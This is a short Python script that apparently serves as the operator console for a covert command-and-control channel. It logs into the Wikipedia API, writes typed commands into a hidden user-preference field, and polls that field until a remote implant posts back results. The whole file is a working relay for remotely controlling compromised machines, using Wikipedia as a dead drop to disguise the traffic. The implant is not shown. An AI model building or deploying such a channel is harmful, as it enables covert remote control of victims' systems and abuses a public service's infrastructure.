import requests
import time

username = 'FILLIN'
password = 'FILLIN' # see https://www.mediawiki.org/wiki/Manual:Bot_passwords
api_url = 'https://en.wikipedia.org/w/api.php'

# initiate the session
session = requests.Session()

# get login token
r1 = session.get(api_url, params={
    'format': 'json',
    'action': 'query',
    'meta': 'tokens',
    'type': 'login',
})
r1.raise_for_status()

# log in
r2 = session.post(api_url, data={
    'format': 'json',
    'action': 'login',
    'lgname': username,
    'lgpassword': password,
    'lgtoken': r1.json()['query']['tokens']['logintoken'],
})
if r2.json()['login']['result'] != 'Success':
    raise RuntimeError(r2.json()['login']['reason'])
	
#print(r2.json())

# get the csrf token
PARAMS_2 = {
    "action": "query",
    "meta": "tokens",
    "format": "json"
}

R = session.get(url=api_url, params=PARAMS_2)
DATA = R.json()

#print(DATA)

CSRF_TOKEN = DATA['query']['tokens']['csrftoken']

# set the checkin frequency
CHECK_IN = 5

# loop for commands from operator
while True:	
    COMMAND = input("Enter command: ")
    PARAMS_3 = {
        "action": "options",
        "format": "json",
        "token": CSRF_TOKEN,
        "optionname": "userjs-arbitraryKeyName",
        # commands start with "command:"
        "optionvalue": "command:" + COMMAND
    }
    # send the command
    R = session.post(api_url, data=PARAMS_3)
    DATA = R.json()

    print(DATA)
    
    # loop until we have a response
    HAVE_RESULT = False
    RESULT = ""
    while not HAVE_RESULT:
        time.sleep(CHECK_IN)
        
        PARAMS_4 = {
            "action": "query",
            "format": "json",
            "meta": "userinfo",
            "uiprop":"options"
        }

        R = session.post(api_url, data=PARAMS_4)
        DATA = R.json()

        RESULT = DATA['query']['userinfo']['options']['userjs-arbitraryKeyName']
        # command result starts with "result:"
        if RESULT.startswith("result:"):
            HAVE_RESULT = True
    
    # print the results of the command
    print(RESULT.split(":",1)[1])